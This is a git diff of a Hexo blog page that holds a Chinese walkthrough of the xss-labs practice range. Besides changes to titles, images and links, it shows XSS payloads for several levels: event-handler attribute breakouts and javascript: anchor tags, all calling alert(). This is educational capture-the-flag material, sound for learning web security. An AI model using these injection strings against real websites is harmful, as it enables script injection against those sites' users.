@@ -30,7 +30,7 @@
 
 
   <title>
- |
+xss-labs(1-20关) |
 ZhiCat的博客 = 欢迎你的到来</title>
 <meta name="generator" content="Hexo 6.2.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -58,7 +58,7 @@ ZhiCat的博客 = 欢迎你的到来</title>
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">
+  <h1 itemprop="name headline">xss-labs(1-20关)
   </h1>
   
 <div class="meta">
@@ -100,12 +100,12 @@ ZhiCat的博客 = 欢迎你的到来</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipesx5fdwj20zk0m81kx.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipetlbztpj20zk0m84qp.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipey0a334j20zk0m8qpt.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipesrnqv3j20zk0m8ava.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciszlczyj20zk0m816d.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclip4jbpj20zk0m87cv.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclx29mstj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicmnywqgpj20zk0m8dwx.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclfdu6exj20zk0m87hw.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclga70tsj20zk0m84mr.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li>
         </ul>
       </div>
     </header>
@@ -166,7 +166,7 @@ ZhiCat的博客 = 欢迎你的到来</title>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick =&#x27;javascript:alert(1)&#x27;//</span><br><span class="line">&#x27; onmouseover=&#x27;javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure>
 
 <h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><p>过滤&lt;&gt;   闭合方式用”</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; onchange=alert`1` </span><br><span class="line">&quot; onchange=alert`1` //</span><br><span class="line">&quot; oninput=alert`1` &quot;</span><br><span class="line">&quot; oninput=alert`1` //</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; onchange=alert`1`</span><br><span class="line">&quot; onchange=alert`1` //</span><br><span class="line">&quot; oninput=alert`1` &quot;</span><br><span class="line">&quot; oninput=alert`1` //</span><br></pre></td></tr></table></figure>
 
 <h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h4><p>script过滤了，onclick也过滤了<br>构造a标签</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&quot;javascript:%61lert(1)&quot;&gt;click me&lt;/a&gt; //</span><br><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;111&lt;/a&gt; //</span><br><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt; //</span><br></pre></td></tr></table></figure>
@@ -229,6 +229,13 @@ ZhiCat的博客 = 欢迎你的到来</title>
    <footer>
 
     <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2022-07-17 23:44:38" itemprop="dateModified" datetime="2022-07-17T23:44:38+08:00">2022-07-17</time>
+  </span>
 </div>
 
       
@@ -263,7 +270,7 @@ ZhiCat的博客 = 欢迎你的到来</title>
   </li>
   <li class="link">
     <strong>本文链接：</strong>
-    <a href="https://zhicat.github.io/2022/07/17/xss-labs%E9%9D%B6%E5%9C%BA/" title="">https://zhicat.github.io/2022/07/17/xss-labs靶场/</a>
+    <a href="https://zhicat.github.io/2022/07/17/xss-labs%E9%9D%B6%E5%9C%BA/" title="xss-labs(1-20关)">https://zhicat.github.io/2022/07/17/xss-labs靶场/</a>
   </li>
   <li class="license">
     <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -282,7 +289,7 @@ ZhiCat的博客 = 欢迎你的到来</title>
     <div class="item left">
       
 
-  <a href="/2022/07/16/MAC%E6%90%AD%E5%BB%BAGithub%E5%8D%9A%E5%AE%A2/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipey84bjtj20zk0m8hdt.jpg" title="MAC搭建Github博客">
+  <a href="/2022/07/16/MAC%E6%90%AD%E5%BB%BAGithub%E5%8D%9A%E5%AE%A2/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexoj0moj20zk0m8kgu.jpg" title="MAC搭建Github博客">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>MAC搭建Github博客</h3>
@@ -373,7 +380,7 @@ ZhiCat的博客 = 欢迎你的到来</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/06/01/hello-world/" title="Hello World">Hello World</a></span>
+    <span><a href="/2022/07/17/xss-labs%E9%9D%B6%E5%9C%BA/" title="xss-labs(1-20关)">xss-labs(1-20关)</a></span>
   </li>
 
       
@@ -382,7 +389,7 @@ ZhiCat的博客 = 欢迎你的到来</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/07/17/xss-labs%E9%9D%B6%E5%9C%BA/" title="未命名">未命名</a></span>
+    <span><a href="/2022/06/01/hello-world/" title="Hello World">Hello World</a></span>
   </li>
 
       
